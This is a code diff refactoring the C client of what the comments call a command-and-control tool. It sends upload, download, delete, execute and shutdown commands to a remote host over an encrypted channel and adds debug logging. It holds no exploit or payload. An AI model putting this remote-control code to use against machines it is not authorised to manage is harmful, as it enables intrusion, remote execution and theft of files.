@@ -1,25 +1,28 @@
+/*!
+ * Client-side Functions
+ */
 #include "hclient.h"
-#include "ssl/crypto.h"
+#include "crypto.h"
 #include "proj_strings.h"	//Necessary for strings...
+#include "debug.h"
 
-ssl_context *ssl_f;
+crypt_context *cc;		// Command and control network connection context
 
-/* ******************************************************************************************************************************
- *
- * CommandToFunction(char** argv, struct proc_vars* info)
- * Description -- function maps the user's command to the correct function
- * Parameters  -- argv = string vector that holds the command (field1), file/application (field2), and/or file (field3)
- *                info = pointer to the process data structure
- * Return      -- returns zero (0) if successful and negative one (-1) on error/failure
- *
- * **************************************************************************************************************************** */
+/*!
+ * int CommandToFunction(char **argv, struct proc_vars *info, crypt_context *ioc)
+ * @brief maps the user's command to the correct function
+ * @param argv - string vector that holds the command (field1), file/application (field2), and/or file (field3)
+ * @param info - pointer to the process data structure
+ * @param ioc - I/O connection context
+ * @return - returns zero (0) if successful and negative one (-1) on error/failure
+ */
 
-int CommandToFunction(char **argv, struct proc_vars *info, ssl_context * ssl)
+int CommandToFunction(char **argv, struct proc_vars *info, crypt_context *ioc)
 {
 	int retval = 0;
 
-	// set ssl_context variable that is global to this file
-	ssl_f = ssl;
+	cc = ioc;	// set command and control context variable that is global to this file
+	DLX(8, printf("crypt_context cc = %p\n", cc));
 
 // May want to reconsider comparisons here, had to add strlen(argv[0]) to exec and ex to discriminate or change name from ex to q for quit.
 
@@ -60,26 +63,28 @@ int CommandToFunction(char **argv, struct proc_vars *info, ssl_context * ssl)
 	return retval;
 }
 
-/* ******************************************************************************************************************************
- * Upload(char** argv, struct proc_vars* info)
- * Description -- function is called when the user enters the "upload" command
- * Parameters  -- argv = argument vector; argv[0] = command "upload", argv[1] = source file/application to upload
- *                       from the local computer, and argv[2] = destination where the file/application will be saved on the
- *                       remote computer
- *                info = pointer to the process data structure
- * Return      -- returns zero (0) on success and non-zero if/when any error occurs at the remote computer
- * **************************************************************************************************************************** */
-
+/*!
+ * Upload(char **argv, struct proc_vars *info)
+ * @brief - called when the user enters the "upload" command to upload a file to the remote host
+ * @param argv - argument vector
+ * 				argv[0] = command "upload"
+ * 				argv[1] = source file/application to upload from the local computer
+ *              argv[2] = destination where the file/application will be saved on the remote computer
+ *
+ * @param info - pointer to the process data structure
+ * @return - returns zero (0) on success and non-zero if/when any error occurs at the remote computer
+ */
 int Upload(char **argv, struct proc_vars *info)
 {
 	int fd;
-	char rfile[255];
-	char lfile[255];
+	char rfile[255];						// Remote filename
+	char lfile[255];						// Local filename
 	char *message;
 	struct stat st;
 	struct send_buf sbuf;
-	struct recv_buf rbuf;
+	REPLY rbuf;
 
+	DL(4);
 	memset(rfile, 0, 255);
 	memset(lfile, 0, 255);
 	memset(&sbuf, 0, sizeof(struct send_buf));
@@ -110,8 +115,6 @@ int Upload(char **argv, struct proc_vars *info)
 		//fprintf(stdout, "\tDestination file (remote) [%s]? ", lfile);
 		fprintf(stdout, "%s [%s]? ", upload4String, lfile);
 		(void) fgets(rfile, 255, stdin);
-
-		// TODO: is -1 correct?
 		rfile[strlen(rfile) - 1] = '\0';
 
 		if (rfile[0] == '\0') {
@@ -137,12 +140,14 @@ int Upload(char **argv, struct proc_vars *info)
 	sbuf.size = htonl(st.st_size);
 
 	//fprintf(stdout, "\n\tupload %s (local) to %s (remote) with size %ld\n", lfile, rfile, st.st_size );
-	fprintf(stdout, "\n\t%s %s %s %s %s %ld\n", uploadString, lfile, upload5String, rfile, upload6String, st.st_size);
+	fprintf(stdout, "\n\t%s %s %s %s %s %ld\n", uploadString, lfile, upload5String, rfile, upload6String, (long int)st.st_size);
 
+	DLX(6, printf("Sending command: command: %d, path: %s, size: %lu\n", sbuf.command, sbuf.path, (long unsigned int)st.st_size));
+	sbuf.command = UPLOAD;
 	SendCommand(&sbuf, &rbuf, info);
 
 	if (rbuf.reply == 0) {
-		if ((rbuf.reply = SendFile(fd, st.st_size)) == 0) {
+		if ((rbuf.reply = SendFile(fd, (size_t)st.st_size)) == 0) {
 			//(void) asprintf(&message, "successful upload of %d bytes from %s to %s\n", (int)st.st_size, lfile, rfile);
 			(void) asprintf(&message, "%s %d %s %s to %s\n", upload7String, (int) st.st_size, upload8String, lfile,
 				      rfile);
@@ -180,13 +185,14 @@ int Upload(char **argv, struct proc_vars *info)
 int Download(char **argv, struct proc_vars *info)
 {
 	int fd;
-	char rfile[255];
-	char lfile[255];
+	char rfile[255];						// Remote filename
+	char lfile[255];						// Local filename
 	char *tptr;
 	char *message;
 	struct send_buf sbuf;
-	struct recv_buf rbuf;
+	REPLY rbuf;
 
+	DL(4);
 	memset(rfile, 0, 255);
 	memset(lfile, 0, 255);
 	memset(&sbuf, 0, 264);
@@ -232,8 +238,11 @@ int Download(char **argv, struct proc_vars *info)
 	fprintf(stdout, "\n\t%s", message);
 	free(message);
 	strncat(sbuf.path, rfile, strlen(rfile));
+	sbuf.command = DOWNLOAD;
 	SendCommand(&sbuf, &rbuf, info);
+	DLX(6, printf("Reply code from remote: 0x%lx - 0x%lx\n", rbuf.reply, rbuf.padding));
 	if (rbuf.reply == 0) {
+		DLX(6, printf("Receiving file, size: %lu\n", (unsigned long)ntohl(rbuf.padding)));
 		if ((rbuf.reply = RecvFile(fd, ntohl(rbuf.padding))) == 0) {
 			//(void) asprintf(&message, "successful download of %d bytes from %s to %s\n", ntohl(rbuf.padding), rfile, lfile);
 			(void) asprintf(&message, "%s %d %s %s to %s\n", download5String, ntohl(rbuf.padding), upload8String, rfile,
@@ -269,8 +278,9 @@ int Remove(char **argv, struct proc_vars *info)
 	char rfile[255];
 	char *message;
 	struct send_buf sbuf;
-	struct recv_buf rbuf;
+	REPLY rbuf;
 
+	DL(4);
 	memset(rfile, 0, 255);
 	memset(&sbuf, 0, 264);
 	memset(&rbuf, 0, 8);
@@ -297,6 +307,7 @@ int Remove(char **argv, struct proc_vars *info)
 	fprintf(stdout, "\n\t%s", message);
 	free(message);
 	strncat(sbuf.path, rfile, strlen(rfile));
+	sbuf.command = DELETE;
 	SendCommand(&sbuf, &rbuf, info);
 	if (rbuf.reply == 0) {
 		//(void) asprintf(&message, "successful deletion of remote file %s\n", rfile);
@@ -326,8 +337,9 @@ int Execute(char **argv, struct proc_vars *info)
 	char rfile[255];
 	char *message;
 	struct send_buf sbuf;
-	struct recv_buf rbuf;
+	REPLY rbuf;
 
+	DL(4);
 	memset(rfile, 0, 255);
 	memset(&sbuf, 0, 264);
 	memset(&rbuf, 0, 8);
@@ -354,7 +366,9 @@ int Execute(char **argv, struct proc_vars *info)
 	fprintf(stdout, "\n\t%s", message);
 	free(message);
 	strncat(sbuf.path, rfile, strlen(rfile));
+	sbuf.command = EXECUTE;
 	SendCommand(&sbuf, &rbuf, info);
+	DLX(6, printf("Reply code from remote: %lu\n", rbuf.reply));
 	if (rbuf.reply == 0) {
 		//(void) asprintf(&message, "successful execution of remote application \"%s\"\n", rfile);
 		(void) asprintf(&message, "%s \"%s\"\n", execute3String, rfile);
@@ -384,10 +398,10 @@ int StopSession(struct proc_vars *info)
 	char question[4];
 	char *message;
 	struct send_buf sbuf;
-	struct recv_buf rbuf;
+	REPLY rbuf;
 
+	DL(4);
 	memset(&sbuf, 0, 264);
-
 	memset(&rbuf, 0, 8);
 
 	if ((info->listen == YES) && ((info->command == EXIT) || (info->command == SHUTDOWNBOTH))) {
@@ -442,11 +456,9 @@ int StopSession(struct proc_vars *info)
 	}
 
 	fprintf(stdout, "\n\t%s", message);
-
 	free(message);
 
 	sbuf.command = info->command;
-
 	SendCommand(&sbuf, &rbuf, info);
 
 	if (rbuf.reply == 0) {
@@ -524,150 +536,129 @@ void DisplayHelp(char *progname)
 	fprintf(stdout, "%s", displayHelp1String);
 }
 
-/* ******************************************************************************************************************************
- *
- * SendFile(char* filename, int fsize, int tcpfd)
- * Description -- function sends a file from the local computer; used with the upload command/function
- * Parameters  -- fd    = file descriptor to the file on the local computer
- *                size  = size of file to uploaded to the remote computer
- *                tcpfd = socket descriptor for the live connection
- * Return      -- returns zero (0) on success and non-zero if any error(s) occur
- *
- * **************************************************************************************************************************** */
 
-int SendFile(int fd, int size)
+/*!
+ * SendFile(char* filename, int fsize)
+ * @brief sends a file from the local computer; used with the upload command/function
+ * @param fd - file descriptor to the file on the local computer
+ * @param size - size of file to be uploaded to the remote computer
+ * @return - returns zero (0) on success and non-zero if any error(s) occur
+ */
+int SendFile(int fd, size_t size)
 {
-	int rbytes;
+	int rbytes, wbytes, ret;
+	unsigned int total_bytes_sent = 0;
 	unsigned char buffer[4096];
 	struct recv_buf rbuf;
 
-	while (size > 0) {
+	DLX(8, printf("Sending %lu byte file...\n", (unsigned long)size));
+	while (total_bytes_sent < size) {
 		memset(buffer, 0, 4096);
 
-		if ((rbytes = read(fd, buffer, 4096)) == ERROR) {
+		// Read the local file
+		if ((rbytes = read(fd, buffer, 4096)) < 0) {
 			perror("\tSendFile()");
 			return ERROR;
 		}
-
-		if (rbytes < 4096) {
-			GenRandomBytes((char *) &buffer[rbytes], (4096 - rbytes), NULL, 0);
+		// Sent bytes read to the remote file
+		wbytes = 0;
+		while (wbytes < rbytes) {
+			if ((ret = crypt_write(cc, buffer, rbytes)) < 0) {
+				//fprintf(stderr, "\tSendFile(): failure sending data to the remote computer\n");
+				fprintf(stderr, "%s", sendFile1String);
+				return ERROR;
+			}
+			wbytes += ret;
 		}
-		// always send 4k chunks. crypt_write() will return number of bytes written
-		if (crypt_write(ssl_f, buffer, 4096) <= 0) {
-			//fprintf(stderr, "\tSendFile(): failure sending data to the remote computer\n");
-			fprintf(stderr, "%s", sendFile1String);
-			return ERROR;
-		}
-
-		size -= rbytes;
+		total_bytes_sent += rbytes;
 	}
+	DLX(8, printf("Sent %lu bytes\n", (unsigned long)size));
 
-	// crypt_read() returns number of bytes written
-	if ((rbytes = crypt_read(ssl_f, (unsigned char *) &rbuf, 8)) <= 0) {
-		//fprintf(stderr, "\tSendFile(): failure receiving acknowledgement from the remote computer\n");
+	// Get the result of the remote's upload file command
+	if ((crypt_read(cc, (unsigned char *) &rbuf, sizeof(REPLY))) <= 0) {
+		//fprintf(stderr, "\tSendFile(): failure receiving acknowledgment from the remote computer\n");
 		fprintf(stderr, "%s", sendFile2String);
 		return ERROR;
 	}
+	DLX(8, printf("Remote results: %lu\n", rbuf.reply));
 	// returns zero on success
 	return (rbuf.reply);
 }
 
-/* ******************************************************************************************************************************
- *
- * RecvFile(int fd, int size, int tcpfd)
- * Description -- function receives a file from the remote computer; used with the download command/function
- * Parameters  -- fd    = file descriptor to the file on the local computer 
- *                size  = size of file to be downloaded to local computer
- *                tcpfd = socket descriptor for the live connection
- * Return      -- returns zero (0) on success and non-zero on failure
- *
- * **************************************************************************************************************************** */
-
+/*!
+ * RecvFile(int fd, int size)
+ * @brief RecvFile receives a file from the remote computer -- used with the download command/function
+ * @param fd -- file descriptor of the file on the local computer
+ * @param size -- size of the file to be downloaded
+ * @returns - 0 is successful or -1 on error
+ */
 int RecvFile(int fd, int size)
 {
-	int rbytes;
+	int rbytes, wbytes;
 	unsigned char buffer[4096];
 	struct recv_buf rbuf;
 
+	DLX(8, printf("Receiving %d byte file...\n", size));
 	while (size > 0) {
 		memset(buffer, 0, 4096);
 
-		if ((rbytes = crypt_read(ssl_f, buffer, 4096)) == ERROR) {
+		DLX(8, printf("crypt_context: %p\n", cc));
+		if ((rbytes = crypt_read(cc, buffer, MAX(size,4096))) < 0) {
 			//fprintf(stderr, "\tRecvFile(): failure receiving data from the remote computer\n");
 			fprintf(stderr, "%s", recvFile1String);
 			return ERROR;
 		}
 
-		if (size < rbytes) {
-			if (write(fd, buffer, size) == ERROR) {
+		DLX(8, printf("Received %d bytes\n", rbytes));
+		// Write received bytes to the local file (fd)
+		wbytes = 0;
+		do {
+			if ((wbytes += write(fd, buffer, rbytes)) < 0) {
 				perror("\tRecvFile()");
 				return ERROR;
 			}
-		} else {
-			if (write(fd, buffer, rbytes) == ERROR) {
-				perror("\tRecvFile()");
-				return ERROR;
-			}
-		}
+		} while (wbytes < rbytes);
 
 		size -= rbytes;
 	}
 
-	if ((rbytes = crypt_read(ssl_f, (unsigned char *) &rbuf, 8)) == ERROR) {
-		//fprintf(stderr, "\tRecvFile(): failure receiving acknowledge from the remote computer\n");
+	// Get result of remote command
+	DL(8);
+	if ((rbytes = crypt_read(cc, (unsigned char *) &rbuf, 8)) < 0) {
+		//fprintf(stderr, "\tRecvFile(): failure receiving acknowledgment from the remote computer\n");
 		fprintf(stderr, "%s", recvFile2String);
 		return ERROR;
 	}
-
 	return (rbuf.reply);
 }
 
-/* ******************************************************************************************************************************
- *
- * SendCommand(struct send_buf* sbuf, struct recv_buf* rbuf, struct proc_vars* info)
- * Description -- function sends the user's command to the remote computer for processing
- * Parameters  -- sbuf = the buffered data that will be sent to the remote computer for processing
- *                rbuf = the buffered data that will receive the remote computer's response to the sent command
- *                info = pointer to the process data structure
- * Return      -- void
- *
- * **************************************************************************************************************************** */
+// ******************************************************************************************************************************
 
-void SendCommand(struct send_buf *sbuf, struct recv_buf *rbuf, struct proc_vars *info)
+/*!
+ * void SendCommand(struct send_buf *sbuf, REPLY *rbuf, struct proc_vars *info)
+ * @brief Sends the user's command to the remote computer for processing
+ * @param sbuf - the buffered data that will be sent to the remote computer for processing
+ * @param rbuf - the buffered data that will receive the remote computer's response to the sent command
+ * @param info - pointer to the process data structure
+ */
+void SendCommand(struct send_buf *sbuf, REPLY *rbuf, struct proc_vars *info)
 {
-	int len = strlen(sbuf->path) + 1;
+	info = info;	// Silence compiler warning about this unused parameter
 
-	sbuf->command = info->command;
-
-	if (sbuf->command != UPLOAD) {
-		if (len < 255) {
-			GenRandomBytes(&sbuf->path[len], (255 - len), (char *) &sbuf->size, 8);
-		} else {
-			GenRandomBytes((char *) &sbuf->size, 8, NULL, 0);
-		}
-	} else {
-		if (len < 255) {
-			GenRandomBytes(&sbuf->path[len], (255 - len), (char *) &sbuf->padding, 4);
-		} else {
-			GenRandomBytes((char *) &sbuf->padding, 4, NULL, 0);
-		}
-	}
-
-
-//      if ( crypt_write( ssl_f, (unsigned char *)sbuf, 264 ) == ERROR )
-	if (crypt_write(ssl_f, (unsigned char *) sbuf, 264) <= 0) {
+	DLX(4, printf("Sending command\n"));
+	if (crypt_write(cc, (unsigned char *) sbuf, 264) <= 0) {
 		//fprintf(stderr, "\tSendCommand(): failure sending request to the remote computer\n");
 		fprintf(stderr, "%s", sendCommand1String);
 		rbuf->reply = htonl(ERROR);
 		return;
 	}
-//      if ( crypt_read( ssl_f, (unsigned char *)rbuf, 8 ) == ERROR )
-	if (crypt_read(ssl_f, (unsigned char *) rbuf, 8) <= 0) {
+
+	if (crypt_read(cc, (unsigned char *) rbuf, sizeof(REPLY)) <= 0) {
 		//fprintf(stderr, "\tSendCommand(): failure receiving response from the remote computer\n");
 		fprintf(stderr, "%s", sendCommand2String);
 		rbuf->reply = htonl(ERROR);
 		return;
 	}
-
+	DLX(8, printf("Reply: 0x%lx, padding = 0x%lu\n", rbuf->reply, rbuf->padding));
 	return;
 }
